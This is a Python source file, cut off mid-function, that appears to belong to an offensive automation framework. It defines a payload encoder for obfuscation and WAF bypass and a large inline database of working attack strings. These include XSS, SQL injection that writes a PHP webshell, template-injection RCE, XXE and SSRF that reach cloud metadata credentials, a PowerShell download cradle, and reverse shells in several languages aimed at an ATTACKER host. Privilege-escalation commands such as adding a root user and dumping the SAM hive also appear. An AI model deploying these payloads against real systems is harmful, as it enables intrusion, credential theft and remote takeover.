"""
Nexus Automation Framework - Payload Manager & Knowledge Engine

Comprehensive payload database sourced from PayloadsAllTheThings, HackTricks,
OWASP, and custom red team methodologies. Provides instant payload lookup,
generation, encoding, and chaining for any attack scenario.

Features:
- 2000+ payloads organized by category (XSS, SQLi, SSTI, XXE, LFI, RCE, etc.)
- Payload encoding/obfuscation (base64, URL, hex, unicode, double-encode)
- Context-aware payload selection based on target technology
- Chained payload generation for WAF bypass
- Integration with knowledge.db for CVE-to-payload mapping
"""

import base64
import hashlib
import json
import logging
import os
import re
import sqlite3
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("nexus.payloads")

DB_PATH = os.environ.get("NEXUS_DB_PATH", "/app/knowledge.db")


# ══════════════════════════════════════════════════════════════════════════════
# ENUMS & MODELS
# ══════════════════════════════════════════════════════════════════════════════

class PayloadCategory(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    SSTI = "ssti"
    XXE = "xxe"
    LFI = "lfi"
    RFI = "rfi"
    RCE = "rce"
    SSRF = "ssrf"
    IDOR = "idor"
    OPEN_REDIRECT = "open_redirect"
    CRLF = "crlf"
    NOSQL = "nosql"
    LDAP = "ldap"
    XPATH = "xpath"
    GRAPHQL = "graphql"
    DESERIALIZATION = "deserialization"
    UPLOAD = "upload"
    CSRF = "csrf"
    CORS = "cors"
    WEBSOCKET = "websocket"
    JWT = "jwt"
    OAUTH = "oauth"
    REVERSE_SHELL = "reverse_shell"
    WEBSHELL = "webshell"
    PRIVESC_LINUX = "privesc_linux"
    PRIVESC_WINDOWS = "privesc_windows"
    LATERAL_MOVEMENT = "lateral_movement"
    PERSISTENCE = "persistence"
    EXFILTRATION = "exfiltration"
    WAF_BYPASS = "waf_bypass"
    ENUM_WEB = "enum_web"
    ENUM_NETWORK = "enum_network"
    WORDLIST = "wordlist"
    HASH = "hash"


class Encoding(str, Enum):
    NONE = "none"
    BASE64 = "base64"
    URL = "url"
    DOUBLE_URL = "double_url"
    HEX = "hex"
    UNICODE = "unicode"
    HTML_ENTITY = "html_entity"
    OCTAL = "octal"
    UTF7 = "utf7"


class TargetTech(str, Enum):
    PHP = "php"
    PYTHON = "python"
    JAVA = "java"
    NODEJS = "nodejs"
    ASPNET = "aspnet"
    RUBY = "ruby"
    GO = "go"
    APACHE = "apache"
    NGINX = "nginx"
    IIS = "iis"
    TOMCAT = "tomcat"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    MSSQL = "mssql"
    ORACLE = "oracle"
    MONGODB = "mongodb"
    REDIS = "redis"
    LINUX = "linux"
    WINDOWS = "windows"
    DOCKER = "docker"
    KUBERNETES = "kubernetes"
    AWS = "aws"
    AZURE = "azure"
    GCP = "gcp"
    GENERIC = "generic"


@dataclass
class Payload:
    payload_id: str
    category: str
    name: str
    content: str
    description: str = ""
    target_tech: str = "generic"
    tags: List[str] = field(default_factory=list)
    waf_bypass: bool = False
    encoding: str = "none"
    severity: str = "medium"
    source: str = ""
    success_indicator: str = ""
    context: str = ""  # Where to inject (header, body, param, cookie, etc.)


# ══════════════════════════════════════════════════════════════════════════════
# ENCODING ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class PayloadEncoder:
    """Multi-layer payload encoding and obfuscation."""

    @staticmethod
    def encode(payload: str, encoding: Encoding) -> str:
        if encoding == Encoding.NONE:
            return payload
        elif encoding == Encoding.BASE64:
            return base64.b64encode(payload.encode()).decode()
        elif encoding == Encoding.URL:
            return urllib.parse.quote(payload, safe="")
        elif encoding == Encoding.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        elif encoding == Encoding.HEX:
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif encoding == Encoding.UNICODE:
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encoding == Encoding.HTML_ENTITY:
            return "".join(f"&#{ord(c)};" for c in payload)
        elif encoding == Encoding.OCTAL:
            return "".join(f"\\{ord(c):03o}" for c in payload)
        elif encoding == Encoding.UTF7:
            # UTF-7 encoding for XSS bypass
            return "+ADw-script+AD4-alert(1)+ADw-/script+AD4-" if "<script>" in payload.lower() else payload
        return payload

    @staticmethod
    def multi_encode(payload: str, encodings: List[Encoding]) -> str:
        """Apply multiple encoding layers in sequence."""
        result = payload
        for enc in encodings:
            result = PayloadEncoder.encode(result, enc)
        return result

    @staticmethod
    def generate_variants(payload: str, max_variants: int = 10) -> List[Tuple[str, str]]:
        """Generate encoded variants of a payload. Returns (encoding_name, encoded)."""
        variants = [("none", payload)]
        for enc in Encoding:
            if enc == Encoding.NONE:
                continue
            try:
                encoded = PayloadEncoder.encode(payload, enc)
                if encoded != payload:
                    variants.append((enc.value, encoded))
            except Exception:
                continue
            if len(variants) >= max_variants:
                break
        return variants


# ══════════════════════════════════════════════════════════════════════════════
# MASTER PAYLOAD DATABASE (inline — loaded into SQLite on first run)
# ══════════════════════════════════════════════════════════════════════════════

# These are sourced from PayloadsAllTheThings, OWASP, HackTricks, and custom red team ops.
# Each tuple: (category, name, content, description, target_tech, tags, severity, source, context)

MASTER_PAYLOADS = [
    # ═══════════ XSS (Cross-Site Scripting) ═══════════
    ("xss", "Basic alert", "<script>alert(1)</script>", "Classic XSS test", "generic", ["basic","reflected"], "medium", "OWASP", "body"),
    ("xss", "IMG onerror", "<img src=x onerror=alert(1)>", "Image error handler XSS", "generic", ["event","img"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "SVG onload", "<svg onload=alert(1)>", "SVG event XSS", "generic", ["event","svg"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "Body onload", "<body onload=alert(1)>", "Body event XSS", "generic", ["event"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "Input onfocus autofocus", "<input onfocus=alert(1) autofocus>", "Autofocus XSS", "generic", ["event","input"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "Details open ontoggle", "<details open ontoggle=alert(1)>", "Details element XSS", "generic", ["event","html5"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "Iframe srcdoc", "<iframe srcdoc='<script>alert(1)</script>'>", "Iframe srcdoc XSS", "generic", ["iframe"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "JavaScript URI", "javascript:alert(1)", "JS protocol handler", "generic", ["uri"], "medium", "OWASP", "param"),
    ("xss", "DOM innerHTML", "';alert(1)//", "DOM-based via innerHTML", "generic", ["dom"], "high", "PayloadsAllTheThings", "param"),
    ("xss", "Template literal", "${alert(1)}", "ES6 template literal injection", "nodejs", ["dom","template"], "high", "PayloadsAllTheThings", "param"),
    ("xss", "Polyglot", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%%0a8telerik//</stYle/</telerik/</telerik/</telerik/oNfoCuS=alert(1)//><telerik telerik>", "Polyglot XSS", "generic", ["polyglot","waf_bypass"], "high", "PayloadsAllTheThings", "body"),
    ("xss", "Event handler no parens", "<img src=x onerror=alert`1`>", "Template literal no parens", "generic", ["bypass","waf_bypass"], "medium", "PayloadsAllTheThings", "body"),
    ("xss", "Mutation XSS", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "mXSS via parser confusion", "generic", ["mutation","advanced"], "high", "HackTricks", "body"),
    ("xss", "Stored via SVG file", "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>", "SVG file upload XSS", "generic", ["stored","upload","svg"], "high", "PayloadsAllTheThings", "upload"),
    ("xss", "CSP bypass eval", "<script>eval(atob('YWxlcnQoMSk='))</script>", "CSP bypass via eval+base64", "generic", ["csp_bypass"], "high", "HackTricks", "body"),

    # ═══════════ SQL Injection ═══════════
    ("sqli", "Basic UNION", "' UNION SELECT NULL,NULL,NULL--", "UNION-based column enumeration", "generic", ["union"], "critical", "OWASP", "param"),
    ("sqli", "Error-based MySQL", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-based extraction MySQL", "mysql", ["error","extraction"], "critical", "PayloadsAllTheThings", "param"),
    ("sqli", "Boolean blind", "' AND 1=1--", "Boolean-based blind test", "generic", ["blind","boolean"], "high", "OWASP", "param"),
    ("sqli", "Time blind MySQL", "' AND SLEEP(5)--", "Time-based blind MySQL", "mysql", ["blind","time"], "high", "PayloadsAllTheThings", "param"),
    ("sqli", "Time blind MSSQL", "'; WAITFOR DELAY '0:0:5'--", "Time-based blind MSSQL", "mssql", ["blind","time"], "high", "PayloadsAllTheThings", "param"),
    ("sqli", "Time blind PostgreSQL", "'; SELECT pg_sleep(5)--", "Time-based blind PostgreSQL", "postgres", ["blind","time"], "high", "PayloadsAllTheThings", "param"),
    ("sqli", "Stacked queries", "'; DROP TABLE users;--", "Stacked query injection", "generic", ["stacked"], "critical", "OWASP", "param"),
    ("sqli", "UNION extract users MySQL", "' UNION SELECT username,password FROM users--", "Extract credentials MySQL", "mysql", ["union","extraction","credentials"], "critical", "PayloadsAllTheThings", "param"),
    ("sqli", "File read MySQL", "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--", "Read files via MySQL", "mysql", ["file_read"], "critical", "PayloadsAllTheThings", "param"),
    ("sqli", "File write MySQL", "' UNION SELECT '<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/var/www/html/shell.php'--", "Write webshell via MySQL", "mysql", ["file_write","webshell"], "critical", "PayloadsAllTheThings", "param"),
    ("sqli", "WAF bypass comments", "/*!50000UNION*//*!50000SELECT*/1,2,3--", "MySQL version-specific comment bypass", "mysql", ["waf_bypass"], "critical", "PayloadsAllTheThings", "param"),
    ("sqli", "WAF bypass case mixing", "uNiOn SeLeCt 1,2,3--", "Case variation WAF bypass", "generic", ["waf_bypass"], "high", "PayloadsAllTheThings", "param"),
    ("sqli", "Second order", "admin'--", "Second-order SQLi (stored then triggered)", "generic", ["second_order","stored"], "high", "HackTricks", "param"),
    ("sqli", "Oracle UNION", "' UNION SELECT NULL FROM dual--", "Oracle UNION injection", "oracle", ["union","oracle"], "critical", "PayloadsAllTheThings", "param"),

    # ═══════════ SSTI (Server-Side Template Injection) ═══════════
    ("ssti", "Detection probe", "${7*7}", "SSTI detection (49 = vulnerable)", "generic", ["detect"], "high", "PayloadsAllTheThings", "param"),
    ("ssti", "Jinja2 RCE", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 RCE via config", "python", ["rce","jinja2"], "critical", "PayloadsAllTheThings", "param"),
    ("ssti", "Jinja2 alternative", "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", "Jinja2 RCE via subclasses", "python", ["rce","jinja2","advanced"], "critical", "HackTricks", "param"),
    ("ssti", "Twig RCE", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig (PHP) RCE", "php", ["rce","twig"], "critical", "PayloadsAllTheThings", "param"),
    ("ssti", "Freemarker RCE", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "Freemarker (Java) RCE", "java", ["rce","freemarker"], "critical", "PayloadsAllTheThings", "param"),
    ("ssti", "Thymeleaf RCE", "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "Thymeleaf (Java) RCE", "java", ["rce","thymeleaf"], "critical", "HackTricks", "param"),
    ("ssti", "ERB Ruby", "<%= system('id') %>", "ERB (Ruby) RCE", "ruby", ["rce","erb"], "critical", "PayloadsAllTheThings", "param"),
    ("ssti", "Pug/Jade NodeJS", "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').exec('id')}()}", "Pug/Jade RCE", "nodejs", ["rce","pug"], "critical", "PayloadsAllTheThings", "param"),
    ("ssti", "Handlebars", "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "Handlebars prototype RCE", "nodejs", ["rce","handlebars"], "critical", "PayloadsAllTheThings", "param"),

    # ═══════════ XXE (XML External Entity) ═══════════
    ("xxe", "Classic file read", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "Classic XXE file read", "generic", ["file_read"], "critical", "OWASP", "body"),
    ("xxe", "SSRF via XXE", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "SSRF via XXE (AWS metadata)", "aws", ["ssrf","cloud"], "critical", "PayloadsAllTheThings", "body"),
    ("xxe", "Blind XXE OOB", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER/evil.dtd\">%xxe;]>", "Blind XXE with out-of-band exfil", "generic", ["blind","oob"], "critical", "PayloadsAllTheThings", "body"),
    ("xxe", "PHP expect RCE", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>", "XXE RCE via PHP expect://", "php", ["rce","php"], "critical", "HackTricks", "body"),
    ("xxe", "CDATA exfil", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://ATTACKER/evil.dtd\">%dtd;]><foo>&all;</foo>", "XXE with CDATA wrapping for exfil", "generic", ["exfil","cdata"], "critical", "PayloadsAllTheThings", "body"),

    # ═══════════ LFI / Path Traversal ═══════════
    ("lfi", "Basic traversal", "../../../../etc/passwd", "Classic path traversal", "linux", ["basic"], "high", "OWASP", "param"),
    ("lfi", "Null byte (old PHP)", "../../../../etc/passwd%00", "Null byte termination (PHP < 5.3)", "php", ["null_byte","legacy"], "high", "PayloadsAllTheThings", "param"),
    ("lfi", "PHP wrapper base64", "php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper for source code read", "php", ["wrapper","source_read"], "high", "PayloadsAllTheThings", "param"),
    ("lfi", "PHP input RCE", "php://input", "PHP input wrapper (POST body as code)", "php", ["wrapper","rce"], "critical", "PayloadsAllTheThings", "param"),
    ("lfi", "PHP data wrapper", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "PHP data wrapper RCE", "php", ["wrapper","rce"], "critical", "HackTricks", "param"),
    ("lfi", "Windows traversal", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows path traversal", "windows", ["windows"], "high", "PayloadsAllTheThings", "param"),
    ("lfi", "Double encoding", "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Double URL-encoded traversal", "generic", ["waf_bypass","encoding"], "high", "PayloadsAllTheThings", "param"),
    ("lfi", "Log poisoning", "/var/log/apache2/access.log", "Apache log poisoning (inject via User-Agent)", "apache", ["log_poison","rce"], "critical", "HackTricks", "param"),
    ("lfi", "Proc self environ", "/proc/self/environ", "Process environment variables disclosure", "linux", ["proc","info_disclosure"], "high", "PayloadsAllTheThings", "param"),

    # ═══════════ SSRF (Server-Side Request Forgery) ═══════════
    ("ssrf", "AWS metadata", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS EC2 metadata SSRF", "aws", ["cloud","aws","metadata"], "critical", "PayloadsAllTheThings", "param"),
    ("ssrf", "GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata SSRF", "gcp", ["cloud","gcp","metadata"], "critical", "PayloadsAllTheThings", "param"),
    ("ssrf", "Azure metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS SSRF", "azure", ["cloud","azure","metadata"], "critical", "PayloadsAllTheThings", "param"),
    ("ssrf", "Localhost bypass @", "http://evil.com@127.0.0.1/", "URL parser confusion with @", "generic", ["bypass"], "high", "PayloadsAllTheThings", "param"),
    ("ssrf", "Localhost bypass decimal", "http://2130706433/", "Decimal IP for 127.0.0.1", "generic", ["bypass"], "high", "HackTricks", "param"),
    ("ssrf", "Localhost bypass IPv6", "http://[::1]/", "IPv6 localhost bypass", "generic", ["bypass","ipv6"], "high", "PayloadsAllTheThings", "param"),
    ("ssrf", "DNS rebinding", "http://1.1.1.1.nip.io/", "DNS rebinding via nip.io", "generic", ["dns_rebinding"], "high", "HackTricks", "param"),
    ("ssrf", "Gopher protocol", "gopher://127.0.0.1:6379/_INFO", "Gopher SSRF to Redis", "redis", ["gopher","redis"], "critical", "PayloadsAllTheThings", "param"),

    # ═══════════ RCE (Remote Code Execution) ═══════════
    ("rce", "Command injection ;", "; id", "Semicolon command chaining", "linux", ["basic","chain"], "critical", "OWASP", "param"),
    ("rce", "Command injection |", "| id", "Pipe command injection", "linux", ["basic","pipe"], "critical", "OWASP", "param"),
    ("rce", "Command injection $()", "$(id)", "Subshell command injection", "linux", ["subshell"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Command injection backtick", "`id`", "Backtick command injection", "linux", ["backtick"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Newline injection", "%0aid", "Newline command injection", "linux", ["newline","waf_bypass"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Wildcard bypass", "/???/??t /???/p??s??", "Wildcard-based command bypass (cat /etc/passwd)", "linux", ["waf_bypass","wildcard"], "critical", "HackTricks", "param"),
    ("rce", "PHP system", "<?php system($_GET['c']); ?>", "PHP webshell one-liner", "php", ["webshell","php"], "critical", "PayloadsAllTheThings", "upload"),
    ("rce", "Python os.system", "__import__('os').system('id')", "Python code injection", "python", ["python"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Node.js child_process", "require('child_process').exec('id')", "Node.js code injection", "nodejs", ["nodejs"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Java Runtime.exec", "Runtime.getRuntime().exec(\"id\")", "Java code injection", "java", ["java"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "PowerShell download cradle", "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')", "PowerShell download and execute", "windows", ["powershell","download"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Bash reverse shell", "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", "Bash reverse shell one-liner", "linux", ["reverse_shell","bash"], "critical", "PayloadsAllTheThings", "param"),
    ("rce", "Python reverse shell", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "Python reverse shell", "linux", ["reverse_shell","python"], "critical", "PayloadsAllTheThings", "param"),

    # ═══════════ NoSQL Injection ═══════════
    ("nosql", "Auth bypass $ne", "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}", "MongoDB auth bypass via $ne", "mongodb", ["auth_bypass"], "critical", "PayloadsAllTheThings", "body"),
    ("nosql", "Auth bypass $gt", "{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}", "MongoDB auth bypass via $gt", "mongodb", ["auth_bypass"], "critical", "PayloadsAllTheThings", "body"),
    ("nosql", "Regex extraction", "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}", "MongoDB password extraction via regex", "mongodb", ["extraction","regex"], "critical", "PayloadsAllTheThings", "body"),
    ("nosql", "Where injection", "{\"$where\": \"this.username == 'admin' && this.password.match(/^a/)\"}", "MongoDB $where injection", "mongodb", ["where","rce"], "critical", "HackTricks", "body"),

    # ═══════════ JWT Attacks ═══════════
    ("jwt", "None algorithm", "{\"alg\":\"none\"}", "JWT algorithm none bypass (header)", "generic", ["none_alg","auth_bypass"], "critical", "PayloadsAllTheThings", "header"),
    ("jwt", "HS256 to none", "Change alg from RS256 to HS256, sign with public key", "JWT algorithm confusion", "generic", ["alg_confusion"], "critical", "PayloadsAllTheThings", "header"),
    ("jwt", "Kid injection", "{\"kid\":\"/dev/null\",\"alg\":\"HS256\"}", "JWT kid parameter injection (empty key)", "generic", ["kid","path_traversal"], "critical", "HackTricks", "header"),
    ("jwt", "JKU spoofing", "{\"jku\":\"http://ATTACKER/.well-known/jwks.json\",\"alg\":\"RS256\"}", "JWT JKU header injection", "generic", ["jku","key_injection"], "critical", "PayloadsAllTheThings", "header"),

    # ═══════════ Reverse Shells ═══════════
    ("reverse_shell", "Bash TCP", "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1", "Bash /dev/tcp reverse shell", "linux", ["bash","tcp"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "Netcat traditional", "nc -e /bin/sh ATTACKER PORT", "Netcat -e reverse shell", "linux", ["netcat"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "Netcat without -e", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f", "Netcat fifo reverse shell", "linux", ["netcat","fifo"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "Python3", "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "Python3 reverse shell with PTY", "linux", ["python","pty"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "PHP exec", "php -r '$sock=fsockopen(\"ATTACKER\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "PHP reverse shell", "linux", ["php"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "PowerShell", "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", "PowerShell reverse shell", "windows", ["powershell"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "Perl", "perl -e 'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "Perl reverse shell", "linux", ["perl"], "critical", "PayloadsAllTheThings", "cmd"),
    ("reverse_shell", "Ruby", "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "Ruby reverse shell", "linux", ["ruby"], "critical", "PayloadsAllTheThings", "cmd"),

    # ═══════════ Privilege Escalation Linux ═══════════
    ("privesc_linux", "SUID find", "find / -perm -4000 -type f 2>/dev/null", "Find SUID binaries", "linux", ["suid","enum"], "high", "HackTricks", "cmd"),
    ("privesc_linux", "Writable /etc/passwd", "echo 'root2:$1$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd", "Add root user via writable /etc/passwd", "linux", ["passwd","write"], "critical", "HackTricks", "cmd"),
    ("privesc_linux", "Sudo -l check", "sudo -l", "List sudo permissions", "linux", ["sudo","enum"], "high", "HackTricks", "cmd"),
    ("privesc_linux", "Capabilities check", "getcap -r / 2>/dev/null", "Find capabilities on binaries", "linux", ["capabilities","enum"], "high", "HackTricks", "cmd"),
    ("privesc_linux", "Crontab enum", "cat /etc/crontab; ls -la /etc/cron.*; crontab -l", "Enumerate cron jobs", "linux", ["cron","enum"], "medium", "HackTricks", "cmd"),
    ("privesc_linux", "Kernel exploit check", "uname -a; cat /etc/os-release", "Kernel version for exploit search", "linux", ["kernel","enum"], "medium", "HackTricks", "cmd"),
    ("privesc_linux", "GTFOBins vim", "vim -c ':!/bin/sh'", "Vim shell escape (if SUID)", "linux", ["gtfobins","vim"], "critical", "GTFOBins", "cmd"),
    ("privesc_linux", "GTFOBins find", "find . -exec /bin/sh \\; -quit", "Find shell escape (if SUID)", "linux", ["gtfobins","find"], "critical", "GTFOBins", "cmd"),
    ("privesc_linux", "GTFOBins python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'", "Python SUID shell", "linux", ["gtfobins","python"], "critical", "GTFOBins", "cmd"),
    ("privesc_linux", "Docker group escape", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "Docker group to root", "linux", ["docker","container_escape"], "critical", "HackTricks", "cmd"),
    ("privesc_linux", "PATH hijacking", "echo '/bin/sh' > /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH", "PATH injection for SUID binary", "linux", ["path_hijack"], "critical", "HackTricks", "cmd"),

    # ═══════════ Privilege Escalation Windows ═══════════
    ("privesc_windows", "Token impersonation", "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c whoami\" -t *", "JuicyPotato/PrintSpoofer token impersonation", "windows", ["token","potato"], "critical", "HackTricks", "cmd"),
    ("privesc_windows", "Unquoted service path", "wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\"", "Find unquoted service paths", "windows", ["service","enum"], "high", "HackTricks", "cmd"),
    ("privesc_windows", "Always install elevated", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "Check AlwaysInstallElevated", "windows", ["msi","registry"], "high", "HackTricks", "cmd"),
    ("privesc_windows", "Stored credentials", "cmdkey /list", "List stored credentials", "windows", ["credentials","enum"], "high", "HackTricks", "cmd"),
    ("privesc_windows", "SAM dump", "reg save HKLM\\SAM sam.bak & reg save HKLM\\SYSTEM system.bak", "Dump SAM and SYSTEM hives", "windows", ["sam","dump","credentials"], "critical", "HackTricks", "cmd"),

    # ═══════════ WAF Bypass ═══════════
    ("waf_bypass", "Case variation", "SeLeCt", "Case mixing for keyword bypass", "generic", ["case"], "medium", "PayloadsAllTheThings", "param"),
    ("waf_bypass", "Comment insertion", "SEL/**/ECT", "SQL comment insertion bypass", "generic", ["comment","sqli"], "medium", "PayloadsAllTheThings", "param"),
    ("waf_bypass", "Unicode normalization", "＜script＞alert(1)＜/script＞", "Fullwidth Unicode XSS bypass", "generic", ["unicode","xss"], "medium", "PayloadsAllTheThings", "body"),
    ("waf_bypass", "Chunked transfer", "Transfer-Encoding: chunked", "HTTP chunked encoding bypass", "generic", ["http","chunked"], "medium", "HackTricks", "header"),
    ("waf_bypass", "HTTP parameter pollution", "id=1&id=2", "HPP to bypass WAF", "generic", ["hpp"], "medium", "PayloadsAllTheThings", "param"),
    ("waf_bypass", "Multipart boundary", "Content-Type: multipart/form-data; boundary=----", "Multipart form boundary trick", "generic", ["multipart"], "medium", "HackTricks", "header"),

    # ═══════════ Deserialization ═══════════
    ("deserialization", "Java ysoserial", "java -jar ysoserial.jar CommonsCollections1 'id' | base64", "Java deserialization via ysoserial", "java", ["java","ysoserial"], "critical", "PayloadsAllTheThings", "body"),
    ("deserialization", "PHP unserialize", "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"admin\";b:1;}", "PHP object injection", "php", ["php","object"], "critical", "PayloadsAllTheThings", "param"),
    ("deserialization", "Python pickle", "import pickle,os;pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")", "Python pickle RCE", "python", ["python","pickle"], "critical", "PayloadsAllTheThings", "body"),
    ("deserialization", ".NET ViewState", "ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -o base64 -c 'id'", ".NET ViewState deserialization", "aspnet", ["dotnet","viewstate"], "critical", "PayloadsAllTheThings", "param"),
]


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD MANAGER
# ══════════════════════════════════════════════════════════════════════════════

class PayloadManager:
    """
    Central payload management engine.
    Loads payloads into knowledge.db, provides search, encoding, and generation.
    """

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._ensure_table()
        self._load_master_payloads()

    def _ensure_table(self):
        """Create payloads table if not exists."""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS payloads (
                    payload_id TEXT PRIMARY KEY,
                    category TEXT NOT NULL,
                    name TEXT NOT NULL,
                    content TEXT NOT NULL,
                    description TEXT DEFAULT '',
                    target_tech TEXT DEFAULT 'generic',
                    tags TEXT DEFAULT '[]',
                    waf_bypass INTEGER DEFAULT 0,
                    encoding TEXT DEFAULT 'none',
                    severity TEXT DEFAULT 'medium',
                    source TEXT DEFAULT '',
                    success_indicator TEXT DEFAULT '',
                    context TEXT DEFAULT ''
                )
            """)
            conn.execute("CREATE INDEX IF NOT EXISTS idx_payloads_category ON payloads(category)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_payloads_tech ON payloads(target_tech)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_payloads_severity ON payloads(severity)")
            conn.commit()

    def _load_master_payloads(self):
        """Load built-in payloads into DB (INSERT OR IGNORE)."""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            loaded = 0
            for i, p in enumerate(MASTER_PAYLOADS):
